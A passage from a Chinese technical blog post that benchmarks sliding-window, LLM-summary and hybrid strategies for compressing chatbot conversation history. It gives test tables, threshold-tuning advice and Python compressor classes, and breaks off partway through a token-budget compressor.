<p><strong>场景2：中等对话（10轮，249 tokens）</strong></p>





































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td>滑动窗口</td><td>10条</td><td>123</td><td>51%</td><td>0.00ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条</td><td>388</td><td>-56% ❌</td><td>7,992ms</td><td>$0.0001</td></tr><tr><td><strong>混合策略</strong></td><td><strong>10条</strong></td><td><strong>123</strong></td><td><strong>51%</strong></td><td>0.01ms</td><td>$0</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs">✅ 滑动窗口 vs 混合策略：完全一致
   10条消息, 123 tokens
</code></pre>
<p><strong>再次验证：10轮（阈值边界）时，混合策略 = 滑动窗口。</strong></p>
<hr/>
<p><strong>场景3：长对话（20轮，560 tokens）</strong></p>





































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>10条</td><td><strong>145</strong></td><td><strong>74%</strong> ✅</td><td>0.00ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条</td><td>597</td><td>-7% ❌</td><td>13,446ms</td><td>$0.0001</td></tr><tr><td>混合策略</td><td>11条</td><td>604</td><td>-8% ❌</td><td>11,663ms</td><td>$0.0001</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs language-bash" lang="bash">📊 滑动窗口 vs 混合策略（使用LLM）：
   滑动窗口: 145 tokens, 0.00ms, <span class="hljs-variable">$0</span>
   混合策略: 604 tokens, 11,663ms, <span class="hljs-variable">$0</span>.0001
   ⚠️ 混合策略Token多 4.2x
</code></pre>
<p><strong>关键矛盾出现：</strong></p>
<ul>
<li>Token效率：滑动窗口完胜（145 vs 604）</li>
<li>速度：滑动窗口完胜（0ms vs 11,663ms）</li>
<li>成本：滑动窗口完胜（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>v</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">0 vs </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">s</span></span></span></span></span>0.0001）</li>
</ul>
<p><strong>但这是trade-off，不是bug！</strong> 混合策略牺牲了效率，换取信息保留。</p>
<hr/>
<p><strong>场景4：超长对话（30轮，933 tokens）</strong></p>





































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>10条</td><td><strong>144</strong></td><td><strong>85%</strong> ✅</td><td>0.00ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条</td><td>608</td><td>35%</td><td>13,204ms</td><td>$0.0001</td></tr><tr><td>混合策略</td><td>11条</td><td>728</td><td>22%</td><td>14,809ms</td><td>$0.0001</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs language-bash" lang="bash">📊 滑动窗口 vs 混合策略（使用LLM）：
   滑动窗口: 144 tokens, 0.00ms, <span class="hljs-variable">$0</span>
   混合策略: 728 tokens, 14,809ms, <span class="hljs-variable">$0</span>.0001
   ⚠️ 混合策略Token多 5.1x
</code></pre>
<p><strong>差距更大了！</strong> 在超长对话中，混合策略的Token是滑动窗口的5倍。</p>
<hr/>
<p><strong>测试3：不同阈值的影响</strong></p>
<p>在20轮对话（560 tokens）中测试不同阈值：</p>















































<table><thead><tr><th>阈值</th><th>使用策略</th><th>压缩后Tokens</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td>5轮</td><td>LLM摘要</td><td>538</td><td>10,926ms</td><td>$0.0001</td></tr><tr><td>10轮</td><td>LLM摘要</td><td>538</td><td>10,555ms</td><td>$0.0001</td></tr><tr><td>15轮</td><td>LLM摘要</td><td>546</td><td>10,872ms</td><td>$0.0001</td></tr><tr><td>20轮</td><td>LLM摘要</td><td>593</td><td>11,278ms</td><td>$0.0001</td></tr><tr><td><strong>25轮</strong></td><td><strong>滑动窗口</strong></td><td><strong>145</strong></td><td><strong>0.00ms</strong></td><td><strong>$0</strong></td></tr></tbody></table>
<p><strong>关键发现：</strong></p>
<pre><code class="hljs language-diff" lang="diff">阈值≤20轮：都用LLM摘要
<span class="hljs-deletion">- Token: 538-593（效率差）</span>
<span class="hljs-deletion">- 耗时: 10-11秒（很慢）</span>
<span class="hljs-deletion">- 成本: $0.0001</span>

阈值=25轮：用滑动窗口
<span class="hljs-deletion">- Token: 145（效率高）</span>
<span class="hljs-deletion">- 耗时: 0ms（极快）</span>
<span class="hljs-deletion">- 成本: $0</span>
</code></pre>
<p><strong>阈值设置的矛盾：</strong></p>
<ul>
<li>阈值太低（5轮）→ 短对话也用LLM，负优化</li>
<li>阈值太高（25轮）→ 大部分对话用滑动窗口，失去意义</li>
<li><strong>推荐：10-15轮</strong> 之间平衡</li>
</ul>
<hr/>
<p><strong>测试4：信息保留对比（核心价值！）</strong></p>
<p>15轮对话，包含5个关键信息：Tom、28岁、上海、浦东、AI工程师</p>




















<table><thead><tr><th>策略</th><th>保留</th><th>详情</th></tr></thead><tbody><tr><td>滑动窗口（5轮）</td><td><strong>0/5 = 0%</strong></td><td>❌ 全部丢失：Tom, 28岁, 上海, 浦东, AI工程师</td></tr><tr><td><strong>混合策略（阈值10轮）</strong></td><td><strong>5/5 = 100%</strong></td><td>✅ 全部保留：Tom, 28岁, 上海, 浦东, AI工程师</td></tr></tbody></table>
<p><strong>这就是混合策略存在的意义！</strong></p>
<p>虽然Token效率差（4-5倍），但：</p>
<ul>
<li>✅ 保留了所有用户信息</li>
<li>✅ 避免了"AI失忆"体验</li>
<li>✅ 用户不需要重复信息</li>
</ul>
<p><strong>用户体验对比：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">场景：<span class="hljs-number">15</span>轮对话后，用户问<span class="hljs-string">"推荐餐厅"</span>

滑动窗口（<span class="hljs-number">0</span><span class="hljs-comment">%保留）：</span>
用户：<span class="hljs-string">"推荐一家适合我的餐厅"</span>
AI：<span class="hljs-string">"你想要什么类型的餐厅？"</span>
用户：<span class="hljs-string">"我前面说过了，我在上海浦东..."</span> ❌ 
      （用户需要重复信息，体验差）

混合策略（<span class="hljs-number">100</span><span class="hljs-comment">%保留）：</span>
用户：<span class="hljs-string">"推荐一家适合我的餐厅"</span>
AI：<span class="hljs-string">"Tom，根据你在上海浦东工作，推荐..."</span> ✅
      （无缝体验，自然连贯）
</code></pre>
<hr/>
<p><strong>测试5：成本效益分析</strong></p>
<p>模拟100次随机长度（5-30轮）的对话：</p>
<pre><code class="hljs language-bash" lang="bash">统计结果：
- 短对话（≤10轮）：20次
- 长对话（&gt;10轮）：80次

成本对比：
- 纯滑动窗口：<span class="hljs-variable">$0</span>.0000
- 纯LLM摘要：<span class="hljs-variable">$0</span>.0100（100次 × <span class="hljs-variable">$0</span>.0001）
- 混合策略：<span class="hljs-variable">$0</span>.0080（80次 × <span class="hljs-variable">$0</span>.0001）

混合策略优势：
- 20次短对话用滑动窗口（快速+<span class="hljs-variable">$0</span>）
- 80次长对话用LLM摘要（智能+<span class="hljs-variable">$0</span>.0001）
- vs 纯LLM摘要：节省 20%（<span class="hljs-variable">$0</span>.002）
- vs 纯滑动窗口：多花 <span class="hljs-variable">$0</span>.008（换取信息保留）
</code></pre>
<p><strong>成本分析：</strong></p>
<ul>
<li>混合策略比纯LLM摘要便宜20%</li>
<li>但比纯滑动窗口贵（滑动窗口是$0）</li>
<li>这$0.008换来的是80次长对话的完美用户体验</li>
</ul>
<p>完整测试代码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Ftests%2Ftest_hybrid.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/tests/test_hybrid.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<hr/>
<h4 data-id="heading-54"><strong>核心矛盾：Token效率 vs 用户体验</strong></h4>
<p>测试数据揭示了混合策略的<strong>本质权衡</strong>：</p>
<p><strong>Token效率排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 滑动窗口：145 tokens（74%压缩）⭐
<span class="hljs-bullet">2.</span> LLM摘要：597 tokens（-7%）
<span class="hljs-bullet">3.</span> 混合策略：604 tokens（-8%）

结论：滑动窗口最优，混合策略最差
</code></pre>
<p><strong>用户体验排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 混合策略/LLM摘要：100%信息保留 ⭐
<span class="hljs-bullet">2.</span> 滑动窗口：0%信息保留

结论：混合策略/LLM摘要完胜
</code></pre>
<p><strong>速度排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 滑动窗口：0.00ms ⭐
<span class="hljs-bullet">2.</span> 混合策略：11,663ms（慢1,166万倍）
<span class="hljs-bullet">3.</span> LLM摘要：13,446ms

结论：滑动窗口完胜
</code></pre>
<p><strong>成本排名：</strong></p>
<pre><code class="hljs language-bash" lang="bash">1. 滑动窗口：<span class="hljs-variable">$0</span> ⭐
2. 混合策略：<span class="hljs-variable">$0</span>.0001（视场景）
3. LLM摘要：<span class="hljs-variable">$0</span>.0001

结论：滑动窗口完胜
</code></pre>
<p><strong>混合策略只在"信息保留"这一个维度获胜，其他全输！</strong></p>
<p>但这正是它的价值定位：<strong>当用户体验比系统效率更重要时，混合策略是最优解。</strong></p>
<hr/>
<h4 data-id="heading-55"><strong>混合策略的真实定位</strong></h4>
<p>基于测试数据，混合策略的定位应该是：</p>
<p><strong>不是为了优化Token，而是为了优化用户体验。</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">核心价值：
✅ 短对话（<span class="hljs-number">20</span><span class="hljs-comment">%）：用滑动窗口，保持速度和零成本</span>
✅ 长对话（<span class="hljs-number">80</span><span class="hljs-comment">%）：用LLM摘要，保留用户信息</span>

付出代价：
❌ Token效率差（长对话时多用<span class="hljs-number">4</span>-<span class="hljs-number">5</span>倍）
❌ 速度慢（长对话时需要<span class="hljs-number">10</span>-<span class="hljs-number">15</span>秒）
❌ 有成本（长对话时$<span class="hljs-number">0.0001</span>/次）

适用场景：
当<span class="hljs-string">"不让用户重复信息"</span>比<span class="hljs-string">"节省Token"</span>更重要时
</code></pre>
<hr/>
<h4 data-id="heading-56"><strong>优缺点总结</strong></h4>
<p>基于真实测试数据：</p>
<p><strong>✅ 三大优势：</strong></p>
<ol>
<li><strong>自动决策，无需人工</strong></li>
</ol>

<pre><code class="hljs">系统根据对话长度自动选择
开发者无需判断，用户无感知
</code></pre>
<ol>
<li><strong>短对话零损失</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">测试验证：短对话时完全等同于滑动窗口
<span class="hljs-deletion">- Token: 完全相同</span>
<span class="hljs-deletion">- 速度: 完全相同</span>
<span class="hljs-deletion">- 成本: 完全相同</span>
</code></pre>
<ol>
<li><strong>长对话保留信息</strong></li>
</ol>

<pre><code class="hljs language-erlang" lang="erlang">测试数据：<span class="hljs-number">100</span><span class="hljs-comment">%保留关键信息</span>
vs 滑动窗口：<span class="hljs-number">0</span><span class="hljs-comment">%保留</span>
避免用户重复解释，体验提升明显
</code></pre>
<p><strong>❌ 三大劣势：</strong></p>
<ol>
<li><strong>Token效率差</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">长对话实测：
<span class="hljs-deletion">- 20轮：多用4.2倍Token</span>
<span class="hljs-deletion">- 30轮：多用5.1倍Token</span>

问题：增加了后续对话的成本
</code></pre>
<ol>
<li><strong>速度慢</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">长对话实测：
<span class="hljs-deletion">- 20轮：11,663ms（约12秒）</span>
<span class="hljs-deletion">- 30轮：14,809ms（约15秒）</span>

问题：用户需要等待，可能影响体验
</code></pre>
<ol>
<li><strong>阈值难调优</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">测试显示：
<span class="hljs-deletion">- 阈值太低（5轮）：短对话也用LLM，负优化</span>
<span class="hljs-deletion">- 阈值太高（25轮）：大多数对话用滑动窗口，失去意义</span>
<span class="hljs-deletion">- 最佳阈值：10-15轮（但需要根据场景调整）</span>

问题：没有通用的"最优阈值"
</code></pre>
<hr/>
<h4 data-id="heading-57"><strong>适用场景指南</strong></h4>
<p>基于真实测试数据：</p>
<p><strong>✅ 推荐使用：</strong></p>
<ol>
<li><strong>通用对话产品</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：对话长度不可预测
理由：
<span class="hljs-deletion">- 自动适应，无需人工判断</span>
<span class="hljs-deletion">- 短对话保持高效</span>
<span class="hljs-deletion">- 长对话保留信息</span>
<span class="hljs-deletion">- 测试证明：节省20%成本 vs 纯LLM</span>

典型：聊天助手、客服机器人、AI顾问
</code></pre>
<ol>
<li><strong>用户体验优先</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：付费产品、VIP服务
理由：
<span class="hljs-deletion">- 用户付费，期望更好体验</span>
<span class="hljs-deletion">- 愿意承担额外成本</span>
<span class="hljs-deletion">- "不让用户重复"比"节省Token"重要</span>
<span class="hljs-deletion">- 测试证明：100%信息保留</span>

典型：高端客服、个人助理、教育辅导
</code></pre>
<ol>
<li><strong>对话长度两极分化</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：既有快速咨询，又有深度讨论
理由：
<span class="hljs-deletion">- 测试显示：20%短对话+80%长对话</span>
<span class="hljs-deletion">- 混合策略针对性优化各场景</span>
<span class="hljs-deletion">- 比任何单一策略都好</span>

典型：综合服务平台、多功能助手
</code></pre>
<p><strong>❌ 不推荐使用：</strong></p>
<ol>
<li><strong>成本敏感场景</strong></li>
</ol>

<pre><code class="hljs language-bash" lang="bash">问题：混合策略有成本（虽然比纯LLM低20%）
数据：100次对话<span class="hljs-variable">$0</span>.008 vs 滑动窗口<span class="hljs-variable">$0</span>
替代：纯滑动窗口

典型：大规模免费产品、初创公司
</code></pre>
<ol>
<li><strong>已知短对话场景</strong></li>
</ol>

<pre><code class="hljs">问题：如果对话肯定&lt;10轮，混合策略=滑动窗口
数据：测试证明短对话时完全相同
替代：直接用滑动窗口，系统更简单

典型：FAQ机器人、快速查询
</code></pre>
<ol>
<li><strong>Token预算严格</strong></li>
</ol>

<pre><code class="hljs">问题：长对话时Token效率差
数据：多用4-5倍Token
替代：滑动窗口或Token动态策略

典型：严格控制成本的企业应用
</code></pre>
<ol>
<li><strong>实时性要求极高</strong></li>
</ol>

<pre><code class="hljs">问题：长对话时有10-15秒延迟
数据：实测11,663ms vs 滑动窗口0.00ms
替代：纯滑动窗口

典型：实时客服、游戏NPC、语音助手
</code></pre>
<hr/>
<h4 data-id="heading-58"><strong>阈值调优建议</strong></h4>
<p>基于测试数据，给出阈值设置建议：</p>
<p><strong>推荐阈值：10轮</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 通用场景（推荐）</span>
compressor = HybridCompressor(llm, threshold_turns=<span class="hljs-number">10</span>)
</code></pre>
<p><strong>理由：</strong></p>
<pre><code class="hljs language-diff" lang="diff">测试数据分析：
<span class="hljs-deletion">- 5轮：太低，短对话也用LLM（负优化）</span>
<span class="hljs-deletion">- 10轮：平衡，测试显示20%短对话+80%长对话</span>
<span class="hljs-deletion">- 15轮：偏保守，更多对话用滑动窗口</span>
<span class="hljs-deletion">- 20轮：太高，测试时才刚切换到LLM</span>
<span class="hljs-deletion">- 25轮：过高，几乎不用LLM，失去意义</span>

最佳：10轮
<span class="hljs-deletion">- 短对话完全使用滑动窗口（速度+成本）</span>
<span class="hljs-deletion">- 长对话及时切换到LLM（信息保留）</span>
</code></pre>
<p><strong>根据场景调整：</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 偏向速度（更多用滑动窗口）</span>
compressor = HybridCompressor(llm, threshold_turns=<span class="hljs-number">15</span>)
<span class="hljs-comment"># 适用：成本敏感、速度优先</span>

<span class="hljs-comment"># 偏向信息保留（更多用LLM）</span>
compressor = HybridCompressor(llm, threshold_turns=<span class="hljs-number">8</span>)
<span class="hljs-comment"># 适用：用户体验优先、付费产品</span>

<span class="hljs-comment"># 激进保留（尽早用LLM）</span>
compressor = HybridCompressor(llm, threshold_turns=<span class="hljs-number">5</span>)
<span class="hljs-comment"># 适用：高端服务、个性化要求高</span>
<span class="hljs-comment"># 注意：短对话也会用LLM，成本更高</span>
</code></pre>
<hr/>
<h4 data-id="heading-59"><strong>最佳实践</strong></h4>
<p><strong>1. 监控策略使用比例</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HybridCompressor</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.stats = {
            <span class="hljs-string">"sliding_count"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"llm_count"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"sliding_tokens"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"llm_tokens"</span>: <span class="hljs-number">0</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        turn_count = <span class="hljs-built_in">len</span>(messages) // <span class="hljs-number">2</span>
        
        <span class="hljs-keyword">if</span> turn_count &lt;= self.threshold_turns:
            self.stats[<span class="hljs-string">"sliding_count"</span>] += <span class="hljs-number">1</span>
            result = self.sliding_window.compress(messages)
            self.stats[<span class="hljs-string">"sliding_tokens"</span>] += <span class="hljs-built_in">sum</span>(
                llm.count_tokens(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> result
            )
        <span class="hljs-keyword">else</span>:
            self.stats[<span class="hljs-string">"llm_count"</span>] += <span class="hljs-number">1</span>
            result = self.llm_summary.compress(messages)
            self.stats[<span class="hljs-string">"llm_tokens"</span>] += <span class="hljs-built_in">sum</span>(
                llm.count_tokens(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> result
            )
        
        <span class="hljs-keyword">return</span> result
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_stats</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""获取使用统计"""</span>
        total = self.stats[<span class="hljs-string">"sliding_count"</span>] + self.stats[<span class="hljs-string">"llm_count"</span>]
        <span class="hljs-keyword">if</span> total == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> {}
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">"sliding_ratio"</span>: self.stats[<span class="hljs-string">"sliding_count"</span>] / total,
            <span class="hljs-string">"llm_ratio"</span>: self.stats[<span class="hljs-string">"llm_count"</span>] / total,
            <span class="hljs-string">"avg_tokens_sliding"</span>: self.stats[<span class="hljs-string">"sliding_tokens"</span>] / self.stats[<span class="hljs-string">"sliding_count"</span>] <span class="hljs-keyword">if</span> self.stats[<span class="hljs-string">"sliding_count"</span>] &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>,
            <span class="hljs-string">"avg_tokens_llm"</span>: self.stats[<span class="hljs-string">"llm_tokens"</span>] / self.stats[<span class="hljs-string">"llm_count"</span>] <span class="hljs-keyword">if</span> self.stats[<span class="hljs-string">"llm_count"</span>] &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
        }

<span class="hljs-comment"># 定期检查</span>
stats = compressor.get_stats()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"滑动窗口使用率: <span class="hljs-subst">{stats[<span class="hljs-string">'sliding_ratio'</span>]:<span class="hljs-number">.1</span>%}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"LLM摘要使用率: <span class="hljs-subst">{stats[<span class="hljs-string">'llm_ratio'</span>]:<span class="hljs-number">.1</span>%}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"平均Token (滑动窗口): <span class="hljs-subst">{stats[<span class="hljs-string">'avg_tokens_sliding'</span>]:<span class="hljs-number">.0</span>f}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"平均Token (LLM): <span class="hljs-subst">{stats[<span class="hljs-string">'avg_tokens_llm'</span>]:<span class="hljs-number">.0</span>f}</span>"</span>)

<span class="hljs-comment"># 根据统计调整阈值</span>
<span class="hljs-keyword">if</span> stats[<span class="hljs-string">'llm_ratio'</span>] &gt; <span class="hljs-number">0.9</span>:
    <span class="hljs-comment"># 90%都在用LLM，阈值太低</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"建议提高阈值到15轮"</span>)
<span class="hljs-keyword">elif</span> stats[<span class="hljs-string">'llm_ratio'</span>] &lt; <span class="hljs-number">0.5</span>:
    <span class="hljs-comment"># 只有50%用LLM，可能阈值太高</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"建议降低阈值到8轮"</span>)
</code></pre>
<p><strong>2. A/B测试不同阈值</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 对照组：阈值10轮</span>
group_a = HybridCompressor(llm, threshold_turns=<span class="hljs-number">10</span>)

<span class="hljs-comment"># 实验组：阈值15轮</span>
group_b = HybridCompressor(llm, threshold_turns=<span class="hljs-number">15</span>)

<span class="hljs-comment"># 观察指标：</span>
<span class="hljs-comment"># 1. 用户满意度（能否记住信息）</span>
<span class="hljs-comment"># 2. 总Token成本</span>
<span class="hljs-comment"># 3. 平均响应时间</span>
<span class="hljs-comment"># 4. 用户重复率（是否重复说过的话）</span>

<span class="hljs-comment"># 运行一周后对比</span>
</code></pre>
<p><strong>3. 针对不同用户类型使用不同阈值</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdaptiveHybridCompressor</span>:
    <span class="hljs-string">"""根据用户类型动态调整阈值"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm</span>):
        self.llm = llm
        self.user_thresholds = {}
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, user_id, messages</span>):
        <span class="hljs-comment"># 获取用户专属阈值</span>
        threshold = self.get_user_threshold(user_id)
        
        compressor = HybridCompressor(self.llm, threshold_turns=threshold)
        <span class="hljs-keyword">return</span> compressor.compress(messages)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_threshold</span>(<span class="hljs-params">self, user_id</span>):
        <span class="hljs-string">"""根据用户类型返回阈值"""</span>
        user_type = get_user_type(user_id)
        
        <span class="hljs-keyword">if</span> user_type == <span class="hljs-string">"vip"</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-number">8</span>  <span class="hljs-comment"># VIP用户，更早用LLM</span>
        <span class="hljs-keyword">elif</span> user_type == <span class="hljs-string">"free"</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-number">15</span>  <span class="hljs-comment"># 免费用户，更多用滑动窗口</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>  <span class="hljs-comment"># 普通用户，标准阈值</span>
</code></pre>
<p><strong>4. 成本控制</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BudgetAwareCompressor</span>:
    <span class="hljs-string">"""有预算限制的混合策略"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, llm, daily_budget=<span class="hljs-number">10.0</span></span>):
        self.compressor = HybridCompressor(llm, threshold_turns=<span class="hljs-number">10</span>)
        self.daily_budget = daily_budget
        self.today_cost = <span class="hljs-number">0.0</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        turn_count = <span class="hljs-built_in">len</span>(messages) // <span class="hljs-number">2</span>
        
        <span class="hljs-comment"># 检查预算</span>
        <span class="hljs-keyword">if</span> turn_count &gt; <span class="hljs-number">10</span>:  <span class="hljs-comment"># 会使用LLM</span>
            estimated_cost = <span class="hljs-number">0.0001</span>
            <span class="hljs-keyword">if</span> self.today_cost + estimated_cost &gt; self.daily_budget:
                <span class="hljs-comment"># 预算不足，强制使用滑动窗口</span>
                logger.warning(<span class="hljs-string">"Daily budget exceeded, using sliding window"</span>)
                <span class="hljs-keyword">return</span> SlidingWindowCompressor(keep_turns=<span class="hljs-number">5</span>).compress(messages)
            
            self.today_cost += estimated_cost
        
        <span class="hljs-keyword">return</span> self.compressor.compress(messages)
</code></pre>
<hr/>
<h4 data-id="heading-60"><strong>小结</strong></h4>
<p>混合策略的真实表现：</p>
<pre><code class="hljs language-diff" lang="diff">定位：
不是最快的（滑动窗口最快）
不是最省Token的（滑动窗口最省）
不是最省钱的（滑动窗口$0）

而是：在"用户体验"和"系统效率"之间的智能权衡

核心价值：
✅ 短对话：完全等同于滑动窗口（测试验证）
✅ 长对话：100%保留用户信息
✅ 自动适应：无需人工判断
✅ 成本优化：比纯LLM节省20%

付出代价：
❌ Token效率差（长对话多用4-5倍）
❌ 速度慢（长对话需要10-15秒）
❌ 系统复杂度增加
❌ 阈值需要调优

最佳实践：
<span class="hljs-deletion">- 推荐阈值：10轮</span>
<span class="hljs-deletion">- 监控使用比例</span>
<span class="hljs-deletion">- A/B测试优化</span>
<span class="hljs-deletion">- 根据用户类型调整</span>
</code></pre>
<p><strong>结论：混合策略是生产环境最实用的方案，适合通用对话场景，但要理解它的trade-off。</strong></p>
<hr/>
<h3 data-id="heading-61"><strong>3.5 策略4：Token动态压缩（Token-based）</strong></h3>
<h4 data-id="heading-62"><strong>核心原理</strong></h4>
<p>Token动态压缩是一种<strong>精确控制</strong>策略：不按轮数，而是按Token预算精确压缩。</p>
<pre><code class="hljs language-markdown" lang="markdown">工作流程：
┌─────────────────┐
│ 设定Token预算    │
│  (如200 tokens) │
└────────┬────────┘
<span class="hljs-code">         │
    ┌────▼──────────┐
    │ 从后往前累加    │
    │ 计算Token数    │
    └────┬──────────┘
         │
    ┌────▼──────────┐
    │ 达到预算？      │
    │ 是 → 停止      │
    │ 否 → 继续添加   │
    └────┬──────────┘
         │
    ┌────▼──────────┐
    │ 返回压缩结果    │
    └───────────────┘
</span></code></pre>
<p><strong>核心思想：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile">不关心保留<span class="hljs-string">"几轮"</span>
只关心保留<span class="hljs-string">"多少Token"</span>

从最新消息开始累加：
<span class="hljs-section">msg_last:  15 tokens → 累计 15</span>
<span class="hljs-section">msg_last-1: 14 tokens → 累计 29</span>
<span class="hljs-section">msg_last-2: 13 tokens → 累计 42</span>
...
累计达到200 → 停止
</code></pre>
<p><strong>与滑动窗口的本质区别：</strong></p>
<pre><code class="hljs language-diff" lang="diff">滑动窗口：
<span class="hljs-deletion">- 保留固定"条数"（如10条）</span>
<span class="hljs-deletion">- Token数不可控（可能100，也可能200）</span>

Token动态：
<span class="hljs-deletion">- 保留固定"Token数"（如200）</span>
<span class="hljs-deletion">- 消息条数不固定（根据每条消息长度）</span>
</code></pre>
<h4 data-id="heading-63"><strong>代码实现</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>, <span class="hljs-type">Callable</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TokenBasedCompressor</span>:
    <span class="hljs-string">"""
    Token动态压缩器
    
    特点：
    - 精确控制Token数量
    - 充分利用上下文窗口
    - 适应消息长度差异
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, token_counter: <span class="hljs-type">Callable</span>, max_tokens: <span class="hljs-built_in">int</span> = <span class="hljs-number">200</span></span>):
        <span class="hljs-string">"""
        Args:
            token_counter: Token计数函数（如 llm.count_tokens）
            max_tokens: Token预算
        """</span>
        self.token_counter = token_counter
        self.max_tokens = max_tokens
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]:
        <span class="hljs-string">"""
        压缩到Token预算内
        
        策略：
        1. 计算总Token数
        2. 如果超预算，从最早的消息开始删除
        3. 直到满足预算
        
        Args:
            messages: 原始消息列表
            
        Returns:
            压缩后的消息列表
        """</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> messages:
            <span class="hljs-keyword">return</span> messages
        
        <span class="hljs-comment"># 计算当前总Token数</span>
        total_tokens = <span class="hljs-built_in">sum</span>(self.token_counter(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages)
        
        <span class="hljs-comment"># 如果没超预算，直接返回</span>
        <span class="hljs-keyword">if</span> total_tokens &lt;= self.max_tokens:
            <span class="hljs-keyword">return</span> messages
        
        <span class="hljs-comment"># 从最早的消息开始删除，直到满足预算</span>
        compressed = messages[:]
        current_tokens = total_tokens
        
